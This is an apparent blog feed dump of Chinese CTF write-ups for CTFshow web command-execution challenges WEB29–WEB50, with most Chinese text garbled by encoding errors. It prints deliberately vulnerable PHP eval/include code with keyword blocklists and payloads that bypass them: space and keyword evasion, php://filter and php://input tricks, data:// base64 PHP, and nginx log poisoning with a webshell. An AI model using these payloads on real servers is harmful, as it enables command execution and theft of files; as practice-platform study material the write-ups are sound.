ä»¥åå…­è¿›åˆ¶å½¢å¼æ˜¾ç¤º curlï¼šç½‘ç»œä¼ è¾“å·¥å…·\n1 2 curl http://example.com/flag.php # è·å–è¿œç¨‹æ–‡ä»¶å†…å®¹ curl -o local.txt http://example.com/flag.php # ä¸‹è½½åˆ°æœ¬åœ° åå¼•å· `ï¼šå‘½ä»¤æ›¿æ¢ï¼Œæ‰§è¡Œå‘½ä»¤å¹¶è¿”å›ç»“æœ\n1 echo `cat flag.php` # æ‰§è¡Œcat flag.phpå¹¶å°†ç»“æœä¼ ç»™echo tacå‘½ä»¤ï¼ˆåå‘catï¼‰ï¼š\n1 tac flag.php nlå‘½ä»¤ï¼ˆå¸¦è¡Œå·æ˜¾ç¤ºï¼‰ï¼š 1 nl flag.php grepå‘½ä»¤ï¼š 1 2 grep \u0026#39;\u0026#39; flag.php # æ˜¾ç¤ºæ‰€æœ‰è¡Œ grep -v \u0026#34;ä¸å­˜åœ¨çš„å­—ç¬¦ä¸²\u0026#34; flag.php # æ˜¾ç¤ºä¸åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„è¡Œï¼ˆå³æ‰€æœ‰è¡Œï¼‰ revå‘½ä»¤ï¼ˆå…ˆåè½¬å†åè½¬å›æ¥ï¼‰ï¼š 1 rev flag.php|rev base64ç¼–ç ï¼š 1 2 base64 flag.php # ç„¶ååœ¨æœ¬åœ°è§£ç  hexdumpï¼š 1 hexdump -C flag.php findå‘½ä»¤çš„-execé€‰é¡¹ï¼š 1 find flag.php -exec cat {} \\; whileå¾ªç¯è¯»å–ï¼š 1 while read line;do echo $line;done\u0026lt;flag.php WEB49 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:22:43 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜ä¹ä¸€çœ‹æŠŠå’±ä»¬çš„%è½¬ä¹‰ç¬¦å·ç»™å¹²æ‰äº†ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰ï¼Œä¼ å‚åˆ°è¿™é‡Œä»¥åæ—©å°±è‡ªåŠ¨è½¬ä¸ºç¬¦å·äº†ï¼Œæ‰€ä»¥ä¾ç„¶å¯ä»¥ä½¿ç”¨%xxè½¬ä¹‰æ¥å†™payloadï¼ŒWEB46çš„payloadåœ¨è¿™é‡Œä»ç„¶å¯ç”¨ã€‚\nWEB50 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:32:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é‡Œ%09è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥æ¢æˆ\u0026lt;è¿™ç§ä¸éœ€è¦ç©ºæ ¼çš„è¯ã€‚\n1 ?c=tac\u0026lt;fl%27%27ag.php|| æ€»ç»“ åœ¨è¿™ä¸€ç³»åˆ—çš„CTFæŒ‘æˆ˜ä¸­ï¼Œæˆ‘ä»¬æ¢ç´¢äº†å„ç§å‘½ä»¤æ‰§è¡Œç»•è¿‡æŠ€å·§ï¼Œä»ç®€å•çš„è¿‡æ»¤åˆ°å¤æ‚çš„å¤šé‡è¿‡æ»¤ã€‚ä»¥ä¸‹æ˜¯æˆ‘ä»¬å­¦åˆ°çš„ä¸»è¦æŠ€æœ¯ï¼š\nç©ºæ ¼ç»•è¿‡ï¼š\nä½¿ç”¨Tabé”®ï¼ˆ%09ï¼‰ ä½¿ç”¨$IFSå˜é‡ ä½¿ç”¨é‡å®šå‘ç¬¦å·\u0026lt; ä½¿ç”¨å•å¼•å·\u0026rsquo;\u0026lsquo;åˆ†éš” å…³é”®å­—ç»•è¿‡ï¼š\nä½¿ç”¨å•å¼•å·åˆ†å‰²å…³é”®å­—ï¼ˆå¦‚c\u0026rsquo;\u0026lsquo;atï¼‰ ä½¿ç”¨é€šé…ç¬¦ï¼ˆ*å’Œ?ï¼‰æ›¿ä»£å®Œæ•´æ–‡ä»¶å ä½¿ç”¨æ›¿ä»£å‘½ä»¤ï¼ˆtacä»£æ›¿catï¼‰ ç‰¹æ®Šå­—ç¬¦ç»•è¿‡ï¼š\nURLç¼–ç ï¼ˆå¦‚%26ä»£æ›¿\u0026amp;ï¼‰ ä½¿ç”¨||ã€\u0026amp;ã€\u0026amp;\u0026amp;ç­‰é€»è¾‘è¿ç®—ç¬¦åˆ†éš”å‘½ä»¤ è¾“å‡ºé‡å®šå‘ç»•è¿‡ï¼š\nä½¿ç”¨||ã€\u0026amp;ç­‰è¿ç®—ç¬¦æŠµæ¶ˆ\u0026gt;/dev/nullçš„æ•ˆæœ æ–‡ä»¶å†…å®¹æŸ¥çœ‹çš„å¤šç§æ–¹æ³•ï¼š\né™¤äº†å¸¸è§çš„catï¼Œè¿˜æœ‰tacã€nlã€grepã€revç­‰å¤šç§å‘½ä»¤ ä½¿ç”¨base64ç¼–ç ååœ¨æœ¬åœ°è§£ç  è¿™äº›æŠ€å·§ä¸ä»…é€‚ç”¨äºCTFæ¯”èµ›ï¼Œä¹Ÿå¯¹ç†è§£Webå®‰å…¨ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´é˜²æŠ¤æœ‰é‡è¦æ„ä¹‰ã€‚é€šè¿‡å­¦ä¹ è¿™äº›ç»•è¿‡æŠ€æœ¯ï¼Œæˆ‘ä»¬èƒ½æ›´å¥½åœ°ç†è§£å¦‚ä½•æ„å»ºå®‰å…¨çš„Webåº”ç”¨ï¼Œé˜²æ­¢å‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚\nç»“è¯­\nå‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯Webå®‰å…¨ä¸­çš„ä¸€ä¸ªé‡è¦æ–¹é¢ï¼Œé€šè¿‡è¿™ç³»åˆ—çš„CTFæŒ‘æˆ˜ï¼Œæˆ‘ä»¬ä¸ä»…å­¦ä¹ äº†å¦‚ä½•åˆ©ç”¨è¿™äº›æ¼æ´ï¼Œæ›´é‡è¦çš„æ˜¯ç†è§£äº†å¦‚ä½•é˜²å¾¡å®ƒä»¬ã€‚å®‰å…¨ä¸æ˜¯ä¸€æˆä¸å˜çš„ï¼Œæ”»å‡»è€…æ€»æ˜¯èƒ½æ‰¾åˆ°æ–°çš„ç»•è¿‡æ–¹æ³•ï¼Œå› æ­¤é˜²å¾¡è€…éœ€è¦ä¸æ–­å­¦ä¹ å’Œæ›´æ–°çŸ¥è¯†ã€‚\n","date":"2025-03-17T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_2/","title":"CTF_show Web å‘½ä»¤æ‰§è¡Œwriteup P2 WEB41-WEB50"},{"content":"æ–°å¹´å¿«ä¹ï¼\n","date":"2025-01-23T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/happy_new_year_2025/","title":"2025æ–°å¹´å¿«ä¹~"},{"content":"CTFSHOW web å‘½ä»¤æ‰§è¡ŒWriteUP Part1 WEB29-WEB40 WEB29 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\nè¿™é‡Œçœ‹åˆ°ç”¨cä¼ å‚ï¼Œåšäº†ä¸€ç‚¹ç®€å•è¿‡æ»¤ ä¸è¿‡è¿™ç‚¹ä¸œè¥¿æ€ä¹ˆèƒ½éš¾å€’æˆ‘ï¼Œå“¼\n1 2 æ–¹æ³•1 c=system(\u0026#34;cp fl*g.php 123.txt\u0026#34;); è®¿é—®123.txtå³å¯ æ–¹æ³•2 c=system(\u0026#34;tac fl*g.php\u0026#34;) å½“ç„¶è¿™é“é¢˜æ–¹æ³•å¤ªå¤šäº†ï¼Œä¸å†ä¸¾ä¾‹å­äº†\nWEB30 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\nè¿™é“é¢˜çœ‹æè¿°å’Œä¸Šä¸€é“é¢˜ä¸€æ ·ï¼Œä¸è¿‡ä»£ç è¿‡æ»¤ç›¸å¯¹æ›´åŠ ä¸¥æ ¼äº†ä¸€äº›\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } å¯ä»¥çœ‹å‡ºè¿‡æ»¤äº†flag system phpè¿™äº›å¸¸ç”¨çš„æŒ‡ä»¤å’Œä¸flagæœ‰å…³çš„å†…å®¹ï¼Œä½†æ˜¯execï¼Œpassthruç­‰æŒ‡ä»¤ä»ç„¶æ²¡è¢«è¿‡æ»¤\nç›´æ¥æ•…æŠ€é‡æ–½ï¼š\n1 ?c=echo exec(\u0026#34;cp fl*g.ph* 1.txt\u0026#34;); è®¿é—®url/1.txtç›´æ¥å¾—åˆ°flag\né™„ï¼šphpæ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ç›¸å…³èŠå£«\nWEB31 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤ è¿™é“é¢˜ä»ç„¶çƒ¤å‘½ä»¤è¿‡æ»¤ï¼Œæ‰“å¼€é¢˜çœ‹ä¸€çœ¼å…ˆ\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } å¥½å®¶ä¼™ï¼Œè¿™æ¬¡è¿‡æ»¤äº†è¿™ä¹ˆå¤šï¼Œç”šè‡³è¿ç©ºæ ¼éƒ½ç»™è¿‡æ»¤äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Œè¿™é‡Œå·çœ‹äº†wpï¼Œå¤§æ¦‚æœ‰ä¸‰ç§æ–¹æ³•ï¼š\n1.å¯ä»¥æ„é€ ä¸€ä¸ªæ–°å‡½æ•° ä¾‹c=eval($_GET[a]);\u0026amp;a=system('cat flag.php');å› ä¸ºåªåˆ¤æ–­äº†ä¼ å…¥çš„cçš„å€¼ï¼Œç›´æ¥æ–°å»ºä¸€ä¸ªå˜é‡ç›´æ¥ç»•è¿‡ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿé€‚ç”¨äºä¸Šé¢ä¸¤ç§\n2.å¯ä»¥åˆ©ç”¨å·²çŸ¥çš„å…¶ä»–å‡½æ•°æ¥å‡‘å‡ºæ‰€éœ€è¦çš„å­—ç¬¦ä¸²æ¥ç»•è¿‡ c=show_source(next(array_reverse(scandir(pos(localeconv()))))); åè¯è§£é‡Šï¼š\nlocaleconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ª\u0026quot;.\u0026quot;\npos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›\nscandir();éå†ç›®å½•ï¼Œè¿™é‡Œå› ä¸ºå‚æ•°ä¸º\u0026quot;.\u0026ldquo;æ‰€ä»¥éå†å½“å‰ç›®å½•\narray_reverse():å…ƒç»„å€’ç½®\nnext():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥\nshow_source():æŸ¥çœ‹æºç \nWEB32 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿‡æ»¤äº†å¤§éƒ¨åˆ†éœ€è¦ç”¨åˆ°çš„ä¸œè¥¿ï¼Œç›´æ¥ç»™cè¿›è¡Œä¼ å‚è¿›è¡Œå‘½ä»¤æ‰§è¡Œç°åœ¨åŸºæœ¬ä¸Šä¸å¯èƒ½äº†ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡ç‰¹æ®Šæ–¹æ³•ç»•è¿‡\nä»¥ä¸‹æ˜¯ä¼ å‚\n1 ?c=include%0a$_GET[1]?%3E\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php è¿™æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿™é‡Œçš„%0aå’Œ%3Eåˆ†åˆ«ä»£è¡¨å›è½¦å’Œ\u0026gt;ï¼Œå¯ä»¥ä»é¢˜ç›®ä¸­å‘ç°é¢˜ç›®ä¸­phpæºæ–‡ä»¶çš„å°–æ‹¬å·å¹¶ä¸æ˜¯é—­åˆçš„ï¼Œä»¥ä¸‹æ˜¯å‚è€ƒè§£æ\nåœ¨cå‚æ•°ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š\nincludeï¼šè¿™æ˜¯ä¸€ä¸ªPHPå‡½æ•°ï¼Œç”¨æ¥åŒ…å«å¹¶æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå®ƒå¯ä»¥ç”¨æ¥åŠ è½½å¹¶æ‰§è¡ŒPHPæ–‡ä»¶ã€‚\n%0aï¼ˆæ¢è¡Œç¬¦ï¼‰ï¼šé€šè¿‡æ’å…¥æ¢è¡Œç¬¦ï¼Œå®ƒå¯èƒ½ä¼šå¸®åŠ©è·³è¿‡è¿‡æ»¤æ¡ä»¶ï¼Œæˆ–è€…å¯¹PHPè¯­æ³•äº§ç”Ÿæ„å¤–çš„å½±å“ã€‚\n$_GET[1]ï¼šè¿™æ˜¯é€šè¿‡GETè¯·æ±‚è·å–åä¸º1çš„å‚æ•°çš„å€¼ã€‚PHPçš„$_GETè¶…å…¨å±€æ•°ç»„å¯ä»¥ç”¨æ¥è·å–URLä¸­çš„æŸ¥è¯¢å‚æ•°ã€‚\n?%3Eï¼ˆ\u0026gt;ï¼‰ï¼šè¡¨ç¤ºHTMLæ ‡ç­¾çš„ç»“æŸç¬¦ã€‚è¿™ä¸ªç¬¦å·çš„ä½œç”¨å¯èƒ½æ˜¯ç»“æŸä¹‹å‰çš„PHPä»£ç å¹¶é˜²æ­¢å®ƒç»§ç»­æ‰§è¡Œã€‚\næ€»ç»“ä¸€ä¸‹ï¼Œè¿™éƒ¨åˆ†çš„å«ä¹‰æ˜¯ï¼šé€šè¿‡includeåŒ…å«ä¸€ä¸ªåŠ¨æ€è·¯å¾„æ–‡ä»¶ï¼Œå¹¶åœ¨è·¯å¾„ä¸­åˆ©ç”¨$_GET[1]æ¥è¿›ä¸€æ­¥æ§åˆ¶è¦æ‰§è¡Œçš„æ–‡ä»¶ã€‚\næ¥ä¸‹æ¥ä½¿ç”¨1=php://filter/convert.base64-encode/resource=flag.phpè¿›è¡Œæ–‡ä»¶è¯»å–ï¼Œå°†è¯»å–å‡ºçš„base64ç¼–ç æ–‡ä»¶è½¬ä¸ºphpæ–‡ä»¶å³å¯ã€‚\nè¿˜æœ‰ä¸€ç§å†™æ³•\n1 url/?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://filter/convert.base64-encode/resource=flag.php WEB33 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 02:22:27 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ // error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜å’Œä¸Šä¸€é“é¢˜åŒºåˆ«ä¸å¤§ï¼ŒåŒæ ·å¯ä»¥ç”¨ä¸Šä¸€é“é¢˜çš„payloadè§£å‡ºã€‚\nä¸è¿‡çœ‹wpåå‘ç°è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼šæ—¥å¿—æ³¨å…¥\n1 url/?c=include$_GET[1]?%3E\u0026amp;1=../../../../var/log/nginx/access.log /var/log/nginx/access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯ã€‚\nWEB34 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:29 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } åŒä¸Šï¼Œè¿™é“é¢˜å¤šè¿‡æ»¤äº†å†’å·ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ç›´æ¥ç”¨ä¸Šä¸Šä¸€é“é¢˜çš„payloadå³å¯è§£å‡ºã€‚\nç¿»wpå‘ç°è¿™å‡ é“é¢˜è¿˜æœ‰ä¸€ç§æ€è·¯ï¼š\né¢˜ç›®å¯¹å¸¸è§å‘½ä»¤éƒ½è¿›è¡Œè¿‡æ»¤, ä½†æ˜¯ä»”ç»†å‘ç°å¯ä»¥åˆ©ç”¨includeè¿›è¡Œç»•è¿‡, å…·ä½“å®ç°æ–¹å¼ä¸º eval(include flag.php;); ,ä½†æ˜¯é¢˜ç›®å±è”½äº†åˆ†å·(;)å’Œç‚¹å·(.), å…¶ä¸­åˆ†å·å¯ä»¥ä½¿ç”¨?\u0026gt;å¹³æ›¿,ä½†æ˜¯ç‚¹å·æ— æ³•ç»•è¿‡, é‚ä½¿ç”¨postæ‰§è¡Œphpä»£ç æ³¨å…¥flag.php, å› æ­¤å¯å¾—payload:\nGETï¼š?c=include$_GET[1]?\u0026gt;\u0026amp;1=php://input\nPOSTä¼ å‚ï¼š\u0026lt;?php system('tac flag.php');?\u0026gt;\néœ€è¦æ³¨æ„,å› ä¸ºPOSTæ²¡æœ‰æŒ‰ç…§key=valueå°è£…æ•°æ®, å› æ­¤hackBarè®¤ä¸ºæ•°æ®æœ‰é—®é¢˜, ä¸ä¼šå‘é€æ•°æ®, å¯ä»¥ä½¿ç”¨Burp Suiteå‘é€æ•°æ®\nè¡¥å……: php://inputé»˜è®¤è¯»å–æ²¡æœ‰å¤„ç†è¿‡çš„POSTæ•°æ®\nWEB35 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿™æ¬¡å¤šè¿‡æ»¤äº†ç­‰äºå·å’Œ\u0026lt;å·ï¼Œä½†æ˜¯WEB32çš„payloadä»ç„¶å¯ç”¨ã€‚å› ä¸ºæ ¹æœ¬æ²¡ç”¨å·¦å°–æ‹¬å·å’Œç­‰å·\nWEB36 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 04:21:16 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;|\\`|echo|\\;|\\(|\\:|\\\u0026#34;|\\\u0026lt;|\\=|\\/|[0-9]/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } è¿™æ¬¡å¤šè¿‡æ»¤äº†æ•°å­—ï¼Œè¯•è¯•WEB32é‚£ä¸ªpayloadï¼Œæ¬¸å¥½åƒä¸è¡Œäº†\u0026hellip;å—ï¼Ÿç›´æ¥æŠŠ1æ¢æˆå­—æ¯å°±å¯ä»¥äº†å•Šoi(#`Oâ€²)ï¼ï¼\nçœ‹ä¸€çœ¼wpå‘ç°ä¸€ç§æ–¹æ³•å’Œä¸Šé¢php://inputå¤§åŒå°å¼‚å°±ä¸è§£é‡Šäº†ã€‚\n?c=include$_GET[v]?\u0026gt;\u0026amp;v=data://text/plain,\u0026lt;?php system(\u0026quot;tac flag.php\u0026quot;)?\u0026gt;\nè¿™é¢˜è¿˜æ˜¯æ‚é±¼ï¼Œç›´æ¥ä¸‹ä¸€é¢˜\nWEB37 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:18:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } å—¯ï¼Ÿè¿™é“é¢˜å¥½åƒä¸ä¸€æ ·äº†ï¼Œä¸€çœ‹è¿™ä¸ç›´æ¥å¸®å’±ä»¬includeå¥½äº†å˜›ï¼Œç›´æ¥ä¼ å‚\n?c=data://text/plain,\u0026lt;?php system(\u0026quot;tac fla*.php\u0026quot;)?\u0026gt;\nä¹Ÿå¯ä»¥ç”¨?c=data://inputç„¶åpostä¼ å‚\nè¿™é‡Œåœ¨wpé‡Œå‘ç°ä¸€ç§æœ‰æ„æ€çš„è§£æ³•?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=åº”è¯¥å¯ä»¥é€šè¿‡è¿™ç§æ–¹æ³•ç»•è¿‡ä¸å°‘è¿‡æ»¤ã€‚\nWEB38 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:23:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|php|file/i\u0026#34;, $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } è¿™é“é¢˜WEB37ä¸­base64é‚£ä¸ªpayloadä»ç„¶å¯ä»¥ç»•è¿‡ï¼Œç”¨php://input+postä¼ å‚ä¹Ÿå¯ä»¥ï¼Œæˆ–è€…ç›´æ¥åœ¨WEB37åŸå§‹çš„payloadä¸Šç›´æ¥å°ä¿®æ”¹ä¸€ä¸‹?c=data://text/plain,\u0026lt;?=system(\u0026quot;tac f*\u0026quot;)?\u0026gt;ä¹Ÿå¯ä»¥ç›´æ¥ç»•è¿‡ã€‚\nWEB39 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:13:21 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag/i\u0026#34;, $c)){ include($c.\u0026#34;.php\u0026#34;); } }else{ highlight_file(__FILE__); } åŒWEB37ã€‚wpæœ‰ä½¬è§£é‡Šï¼šæ‹¼æ¥çš„phpå¯ä»¥ä¸ç”¨ç®¡ï¼Œincludeåªä¼šå¤„ç†å†…éƒ¨çš„å†…å®¹ï¼Œå¯¹flagçš„è¿‡æ»¤å¯ä»¥é‡‡ç”¨æ‹¼æ¥çš„æ–¹å¼ ?c=data://text/plainï¼Œè¿™é‡Œå·æ‡’äº†ï¼Œä¹Ÿå¯ä»¥base64ä¸€ä¸‹ã€‚\nWEB37ä¸­çš„å°–æ‹¬å·é—­åˆå¯ä»¥ç»•è¿‡.phpï¼Œå› ä¸ºç›¸å½“äºç›´æ¥ç»“æŸäº†phpæ–‡ä»¶ï¼ŒåŒç†ä¹Ÿå¯ä»¥ç”¨//æ³¨é‡Šæ‰åé¢çš„å†…å®¹ï¼Œæ¯”å¦‚?c=data://text/plain,\u0026lt;?php%20system(\u0026quot;tac%20fla*.php\u0026quot;);//æ¥è§£å†³è¿™é“é¢˜ã€‚\nWEB40 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:03:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\\u0026#39;|\\\u0026#34;|\\,|\\\u0026lt;|\\.|\\\u0026gt;|\\/|\\?|\\\\\\\\/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 